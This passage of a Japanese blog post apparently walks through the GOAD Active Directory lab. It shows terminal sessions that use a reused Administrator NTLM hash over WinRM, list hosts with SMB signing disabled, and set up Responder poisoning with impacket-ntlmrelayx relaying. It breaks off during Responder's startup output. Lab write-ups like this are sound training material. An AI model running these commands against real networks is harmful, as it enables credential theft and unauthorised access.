Changes</a></div></header><div class=post-content><h2 id=round-2>Round 2<a hidden class=anchor aria-hidden=true href=#round-2>#</a></h2><p>WinterfellではAdministratorのパスワードを使いまわしていることがわかる</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>nxc</span> <span class=nx>winrm</span> <span class=mf>192.168.56.10</span><span class=o>-</span><span class=mi>12</span> <span class=mf>192.168.56.22</span><span class=o>-</span><span class=mi>23</span> <span class=o>-</span><span class=nx>u</span> <span class=nx>Administrator</span> <span class=o>-</span><span class=nx>H</span> <span class=s1>&#39;dbd13e1c4e338284ac4e9874f7de6ef4&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.10</span>   <span class=mi>5985</span>   <span class=nx>KINGSLANDING</span>     <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2019</span> <span class=nx>Build</span> <span class=mi>17763</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>KINGSLANDING</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.12</span>   <span class=mi>5985</span>   <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Build</span> <span class=mi>14393</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>MEEREEN</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.23</span>   <span class=mi>5985</span>   <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Build</span> <span class=mi>14393</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>BRAAVOS</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.11</span>   <span class=mi>5985</span>   <span class=nx>WINTERFELL</span>       <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2019</span> <span class=nx>Build</span> <span class=mi>17763</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>WINTERFELL</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>north</span><span class=p>.</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.22</span>   <span class=mi>5985</span>   <span class=nx>CASTELBLACK</span>      <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2019</span> <span class=nx>Build</span> <span class=mi>17763</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>CASTELBLACK</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>north</span><span class=p>.</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.10</span>   <span class=mi>5985</span>   <span class=nx>KINGSLANDING</span>     <span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>Administrator</span><span class=o>:</span><span class=nx>dbd13e1c4e338284ac4e9874f7de6ef4</span>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.12</span>   <span class=mi>5985</span>   <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>Administrator</span><span class=o>:</span><span class=nx>dbd13e1c4e338284ac4e9874f7de6ef4</span>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.23</span>   <span class=mi>5985</span>   <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>-</span><span class=p>]</span> <span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>Administrator</span><span class=o>:</span><span class=nx>dbd13e1c4e338284ac4e9874f7de6ef4</span>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.11</span>   <span class=mi>5985</span>   <span class=nx>WINTERFELL</span>       <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>north</span><span class=p>.</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>Administrator</span><span class=o>:</span><span class=nx>dbd13e1c4e338284ac4e9874f7de6ef4</span> <span class=p>(</span><span class=nx>Pwn3d</span><span class=o>!</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>WINRM</span>       <span class=mf>192.168.56.22</span>   <span class=mi>5985</span>   <span class=nx>CASTELBLACK</span>      <span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>north</span><span class=p>.</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=err>\</span><span class=nx>Administrator</span><span class=o>:</span><span class=nx>dbd13e1c4e338284ac4e9874f7de6ef4</span> <span class=p>(</span><span class=nx>Pwn3d</span><span class=o>!</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Running</span> <span class=nx>nxc</span> <span class=nx>against</span> <span class=mi>5</span> <span class=nx>targets</span> <span class=err>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span> <span class=mi>100</span><span class=o>%</span> <span class=mi>0</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>00</span>
</span></span></code></pre></div><p>それはそれとして他に色々探ってみる</p><p>NTLMリレー攻撃をするためにSMBサイニングが無効なサービスの情報を集める</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>nxc</span> <span class=nx>smb</span> <span class=mf>192.168.56.10</span><span class=o>-</span><span class=mi>23</span> <span class=o>--</span><span class=nx>gen</span><span class=o>-</span><span class=nx>relay</span><span class=o>-</span><span class=nx>list</span> <span class=nx>relay</span><span class=p>.</span><span class=nx>txt</span>    
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.10</span>   <span class=mi>445</span>    <span class=nx>KINGSLANDING</span>     <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2019</span> <span class=nx>Build</span> <span class=mi>17763</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>KINGSLANDING</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.12</span>   <span class=mi>445</span>    <span class=nx>MEEREEN</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Standard</span> <span class=nx>Evaluation</span> <span class=mi>14393</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>MEEREEN</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.11</span>   <span class=mi>445</span>    <span class=nx>WINTERFELL</span>       <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2019</span> <span class=nx>Build</span> <span class=mi>17763</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>WINTERFELL</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>north</span><span class=p>.</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.23</span>   <span class=mi>445</span>    <span class=nx>BRAAVOS</span>          <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=nx>Server</span> <span class=mi>2016</span> <span class=nx>Standard</span> <span class=nx>Evaluation</span> <span class=mi>14393</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>BRAAVOS</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>essos</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>SMB</span>         <span class=mf>192.168.56.22</span>   <span class=mi>445</span>    <span class=nx>CASTELBLACK</span>      <span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Windows</span> <span class=mi>10</span> <span class=o>/</span> <span class=nx>Server</span> <span class=mi>2019</span> <span class=nx>Build</span> <span class=mi>17763</span> <span class=nx>x64</span> <span class=p>(</span><span class=nx>name</span><span class=o>:</span><span class=nx>CASTELBLACK</span><span class=p>)</span> <span class=p>(</span><span class=nx>domain</span><span class=o>:</span><span class=nx>north</span><span class=p>.</span><span class=nx>sevenkingdoms</span><span class=p>.</span><span class=nx>local</span><span class=p>)</span> <span class=p>(</span><span class=nx>signing</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span> <span class=p>(</span><span class=nx>SMBv1</span><span class=o>:</span><span class=nx>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nx>Running</span> <span class=nx>nxc</span> <span class=nx>against</span> <span class=mi>14</span> <span class=nx>targets</span> <span class=err>━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━</span> <span class=mi>100</span><span class=o>%</span> <span class=mi>0</span><span class=o>:</span><span class=mi>00</span><span class=o>:</span><span class=mi>00</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>cat</span> <span class=nx>relay</span><span class=p>.</span><span class=nx>txt</span>       
</span></span><span class=line><span class=cl><span class=mf>192.168.56.23</span>
</span></span><span class=line><span class=cl><span class=mf>192.168.56.22</span>
</span></span></code></pre></div><p>サイニングfalseなターゲットの情報を取得できたのでNTLM認証を中継することができそう</p><p>Responderの設定を変えて</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=o>**</span><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>sudo</span> <span class=nx>sed</span> <span class=o>-</span><span class=nx>i</span> <span class=s1>&#39;s/HTTP = On/HTTP = Off/g&#39;</span> <span class=o>/</span><span class=nx>etc</span><span class=o>/</span><span class=err>\</span><span class=nx>responder</span><span class=o>/</span><span class=nx>Responder</span><span class=p>.</span><span class=nx>conf</span> <span class=o>&amp;&amp;</span> <span class=nx>sudo</span> <span class=nx>cat</span> <span class=o>/</span><span class=nx>etc</span><span class=o>/</span><span class=nx>responder</span><span class=o>/</span><span class=nx>Responder</span><span class=p>.</span><span class=nx>conf</span> <span class=o>|</span> <span class=nx>grep</span> <span class=o>--</span><span class=nx>color</span><span class=o>=</span><span class=nx>never</span> <span class=s1>&#39;HTTP =&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>HTTP</span> <span class=o>=</span> <span class=nx>Off</span>
</span></span><span class=line><span class=cl>                                                                                                                                                                                                                                                                                                                           
</span></span><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>sudo</span> <span class=nx>sed</span> <span class=o>-</span><span class=nx>i</span> <span class=s1>&#39;s/SMB = On/SMB = Off/g&#39;</span> <span class=o>/</span><span class=nx>etc</span><span class=o>/</span><span class=nx>responder</span><span class=o>/</span><span class=nx>Responder</span><span class=p>.</span><span class=nx>conf</span> <span class=o>&amp;&amp;</span> <span class=nx>sudo</span> <span class=nx>cat</span> <span class=o>/</span><span class=nx>etc</span><span class=o>/</span><span class=nx>responder</span><span class=o>/</span><span class=nx>Responder</span><span class=p>.</span><span class=nx>conf</span> <span class=o>|</span> <span class=nx>grep</span> <span class=o>--</span><span class=nx>color</span><span class=o>=</span><span class=nx>never</span> <span class=s1>&#39;HTTP =&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>HTTP</span> <span class=o>=</span> <span class=nx>Off</span><span class=o>**</span>
</span></span></code></pre></div><p>ntlmrelayxを起動</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=o>**</span><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=err>/goad]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>impacket</span><span class=o>-</span><span class=nx>ntlmrelayx</span> <span class=o>-</span><span class=nx>tf</span> <span class=nx>relay</span><span class=p>.</span><span class=nx>txt</span> <span class=o>-</span><span class=k>of</span> <span class=nx>netntlm</span> <span class=o>-</span><span class=nx>smb2support</span> <span class=o>-</span><span class=nx>socks</span>
</span></span><span class=line><span class=cl><span class=nx>Impacket</span> <span class=nx>v0</span><span class=mf>.12.0</span><span class=p>.</span><span class=nx>dev1</span> <span class=o>-</span> <span class=nx>Copyright</span> <span class=mi>2023</span> <span class=nx>Fortra</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>LDAPS</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>LDAP</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>SMTP</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>RPC</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>DCSYNC</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>SMB</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>HTTPS</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>HTTP</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>IMAPS</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>IMAP</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Protocol</span> <span class=nx>Client</span> <span class=nx>MSSQL</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Running</span> <span class=k>in</span> <span class=nx>relay</span> <span class=nx>mode</span> <span class=nx>to</span> <span class=nx>hosts</span> <span class=k>in</span> <span class=nx>targetfile</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SOCKS</span> <span class=nx>proxy</span> <span class=nx>started</span><span class=p>.</span> <span class=nx>Listening</span> <span class=nx>on</span> <span class=mf>127.0.0.1</span><span class=o>:</span><span class=mi>1080</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SMB</span> <span class=nx>Socks</span> <span class=nx>Plugin</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>HTTP</span> <span class=nx>Socks</span> <span class=nx>Plugin</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>SMTP</span> <span class=nx>Socks</span> <span class=nx>Plugin</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>IMAP</span> <span class=nx>Socks</span> <span class=nx>Plugin</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>IMAPS</span> <span class=nx>Socks</span> <span class=nx>Plugin</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>MSSQL</span> <span class=nx>Socks</span> <span class=nx>Plugin</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>HTTPS</span> <span class=nx>Socks</span> <span class=nx>Plugin</span> <span class=nx>loaded</span><span class=p>..</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Setting</span> <span class=nx>up</span> <span class=nx>SMB</span> <span class=nx>Server</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Setting</span> <span class=nx>up</span> <span class=nx>HTTP</span> <span class=nx>Server</span> <span class=nx>on</span> <span class=nx>port</span> <span class=mi>80</span>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=nx>Serving</span> <span class=nx>Flask</span> <span class=nx>app</span> <span class=s1>&#39;impacket.examples.ntlmrelayx.servers.socksserver&#39;</span>
</span></span><span class=line><span class=cl> <span class=o>*</span> <span class=nx>Debug</span> <span class=nx>mode</span><span class=o>:</span> <span class=nx>off</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Setting</span> <span class=nx>up</span> <span class=nx>WCF</span> <span class=nx>Server</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Setting</span> <span class=nx>up</span> <span class=nx>RAW</span> <span class=nx>Server</span> <span class=nx>on</span> <span class=nx>port</span> <span class=mi>6666</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Servers</span> <span class=nx>started</span><span class=p>,</span> <span class=nx>waiting</span> <span class=k>for</span> <span class=nx>connections</span>
</span></span><span class=line><span class=cl><span class=nx>Type</span> <span class=nx>help</span> <span class=k>for</span> <span class=nx>list</span> <span class=k>of</span> <span class=nx>commands</span>
</span></span><span class=line><span class=cl><span class=nx>ntlmrelayx</span><span class=o>&gt;**</span>
</span></span></code></pre></div><p>Responderも起動して</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-jsx data-lang=jsx><span class=line><span class=cl><span class=err>┌──</span><span class=p>(</span><span class=nx>kali</span><span class=err>㉿</span><span class=nx>kali</span><span class=p>)</span><span class=o>-</span><span class=p>[</span><span class=o>~</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=err>└─</span><span class=nx>$</span> <span class=nx>sudo</span> <span class=nx>responder</span> <span class=o>-</span><span class=nx>I</span> <span class=nx>eth1</span>     
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nx>sudo</span><span class=p>]</span> <span class=nx>password</span> <span class=k>for</span> <span class=nx>kali</span><span class=o>:</span> 
</span></span><span class=line><span class=cl>                                         <span class=nx>__</span>
</span></span><span class=line><span class=cl>  <span class=p>.</span><span class=o>----</span><span class=p>.</span><span class=o>-----</span><span class=p>.</span><span class=o>-----</span><span class=p>.</span><span class=o>-----</span><span class=p>.</span><span class=o>-----</span><span class=p>.</span><span class=o>-----</span><span class=p>.</span><span class=o>--|</span>  <span class=o>|</span><span class=p>.</span><span class=o>-----</span><span class=p>.</span><span class=o>----</span><span class=p>.</span>
</span></span><span class=line><span class=cl>  <span class=o>|</span>   <span class=nx>_</span><span class=o>|</span>  <span class=o>-</span><span class=nx>__</span><span class=o>|</span><span class=nx>__</span> <span class=o>--|</span>  <span class=nx>_</span>  <span class=o>|</span>  <span class=nx>_</span>  <span class=o>|</span>     <span class=o>|</span>  <span class=nx>_</span>  <span class=o>||</span>  <span class=o>-</span><span class=nx>__</span><span class=o>|</span>   <span class=nx>_</span><span class=o>|</span>
</span></span><span class=line><span class=cl>  <span class=o>|</span><span class=nx>__</span><span class=o>|</span> <span class=o>|</span><span class=nx>_____</span><span class=o>|</span><span class=nx>_____</span><span class=o>|</span>   <span class=nx>__</span><span class=o>|</span><span class=nx>_____</span><span class=o>|</span><span class=nx>__</span><span class=o>|</span><span class=nx>__</span><span class=o>|</span><span class=nx>_____</span><span class=o>||</span><span class=nx>_____</span><span class=o>|</span><span class=nx>__</span><span class=o>|</span>
</span></span><span class=line><span class=cl>                   <span class=o>|</span><span class=nx>__</span><span class=o>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>           <span class=nx>NBT</span><span class=o>-</span><span class=nx>NS</span><span class=p>,</span> <span class=nx>LLMNR</span> <span class=o>&amp;</span> <span class=nx>MDNS</span> <span class=nx>Responder</span> <span class=mf>3.1.4.0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>To</span> <span class=nx>support</span> <span class=k>this</span> <span class=nx>project</span><span class=o>:</span>
</span></span><span class=line><span class=cl>  <span class=nx>Github</span> <span class=o>-&gt;</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//github.com/sponsors/lgandx
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nx>Paypal</span>  <span class=o>-&gt;</span> <span class=nx>https</span><span class=o>:</span><span class=c1>//paypal.me/PythonResponder
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>  <span class=nx>Author</span><span class=o>:</span> <span class=nx>Laurent</span> <span class=nx>Gaffie</span> <span class=p>(</span><span class=nx>laurent</span><span class=p>.</span><span class=nx>gaffie</span><span class=err>@</span><span class=nx>gmail</span><span class=p>.</span><span class=nx>com</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=nx>To</span> <span class=nx>kill</span> <span class=k>this</span> <span class=nx>script</span> <span class=nx>hit</span> <span class=nx>CTRL</span><span class=o>-</span><span class=nx>C</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Poisoners</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>LLMNR</span>                      <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>NBT</span><span class=o>-</span><span class=nx>NS</span>                     <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>MDNS</span>                       <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>DNS</span>                        <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>DHCP</span>                       <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=nx>Servers</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=nx>HTTP</span> <span class=nx>server</span>                <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>HTTPS</span> <span class=nx>server</span>               <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>WPAD</span> <span class=nx>proxy</span>                 <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Auth</span> <span class=nx>proxy</span>                 <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>SMB</span> <span class=nx>server</span>                 <span class=p>[</span><span class=nx>OFF</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>Kerberos</span> <span class=nx>server</span>            <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>SQL</span> <span class=nx>server</span>                 <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>FTP</span> <span class=nx>server</span>                 <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>IMAP</span> <span class=nx>server</span>                <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>POP3</span> <span class=nx>server</span>                <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>SMTP</span> <span class=nx>server</span>                <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>DNS</span> <span class=nx>server</span>                 <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>LDAP</span> <span class=nx>server</span>                <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>MQTT</span> <span class=nx>server</span>                <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=nx>RDP</span> <span class=nx>server</span>                 <span class=p>[</span><span class=nx>ON</span><span class=p>]</span>
